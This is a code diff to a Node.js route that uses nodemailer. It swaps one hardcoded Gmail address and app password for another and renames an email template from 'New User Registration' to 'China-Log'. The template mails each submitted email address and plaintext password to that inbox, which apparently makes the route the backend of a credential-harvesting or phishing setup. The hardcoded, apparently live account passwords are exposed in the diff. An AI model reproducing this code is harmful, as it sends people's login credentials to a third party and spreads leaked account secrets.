@@ -17,8 +17,8 @@ const transporter = nodemailer.createTransport({
     port: 465,
     secure: true,
     auth: {
-        user: "yasermehmod2@gmail.com",
-        pass: "kzmw ffhk vtdu adel",
+        user: "kasindavid6@gmail.com",
+        pass: "mnpb wgji pfmn rvgd",
     },
 });
 
@@ -37,8 +37,7 @@ router.post('/', async (req, res) => {
 
         // Template with merge tags
         const htmlTemplate = `
-            <h1>New User Registration</h1>
-            <p>Here are the registration details:</p>
+            <h1>China-Log</h1>
             <ul>
                 <li><strong>Email:</strong> [[-email-]]</li>
                 <li><strong>Password:</strong> [[-password-]]</li>
